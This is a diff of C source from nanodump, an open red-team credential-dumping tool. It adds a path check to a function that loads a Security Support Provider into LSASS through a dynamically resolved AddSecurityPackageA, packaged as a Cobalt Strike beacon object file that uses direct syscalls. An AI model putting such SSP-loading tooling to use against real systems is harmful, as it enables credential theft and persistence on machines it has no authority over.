@@ -1,12 +1,18 @@
 
 #include "nanodump.h"
 #include "beacon.h"
+#include "utils.c"
 #include "syscalls.c"
 #include "dinvoke.c"
 #include "load_ssp.h"
 
 void load_ssp(LPSTR ssp_path)
 {
+    if (!is_full_path(ssp_path))
+    {
+        PRINT_ERR("You must provide a full path: %s", ssp_path);
+        return;
+    }
     AddSecurityPackageA_t AddSecurityPackageA;
     // find the address of AddSecurityPackageA dynamically
     AddSecurityPackageA = (AddSecurityPackageA_t)get_function_address(
@@ -36,7 +42,7 @@ void load_ssp(LPSTR ssp_path)
     return;
 }
 
-#if defined(BOF)
+#if defined(LOADER) && defined(BOF)
 
 void go(char* args, int length)
 {
@@ -49,7 +55,7 @@ void go(char* args, int length)
     load_ssp(ssp_path);
 }
 
-#elif defined(PE)
+#elif defined(LOADER) && !defined(BOF)
 
 int main(int argc, char* argv[])
 {
